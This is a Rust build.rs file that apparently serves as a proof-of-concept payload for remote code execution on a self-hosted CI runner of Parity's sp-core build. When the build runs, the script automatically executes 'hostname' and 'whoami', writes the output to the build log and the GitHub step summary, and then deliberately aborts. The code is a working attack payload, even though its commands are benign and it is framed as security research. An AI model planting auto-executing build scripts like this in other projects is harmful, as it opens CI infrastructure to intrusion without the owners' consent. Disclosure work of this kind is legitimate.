fn main() {
	// [POC] Security research marker — Parity cmd-bot RCE validation (Blackroot13 / taol12).
	// Proves attacker-controlled code executes on the self-hosted runner. Fail-fast: no further build.
	let out = |cmd: &str| std::process::Command::new(cmd).output()
		.map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
		.unwrap_or_else(|e| format!("unavailable ({e})"));
	let line = format!("POC_MARKER sp-core build.rs EXECUTED | hostname={} | whoami={}", out("hostname"), out("whoami"));
	println!("cargo:warning={}", line);
	println!("{}", line);
	if let Ok(p) = std::env::var("GITHUB_STEP_SUMMARY") {
		use std::io::Write;
		if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(p) {
			let _ = writeln!(f, "### {}", line);
		}
	}
	panic!("[POC] intentional fail-fast — execution proven, stopping build");
}
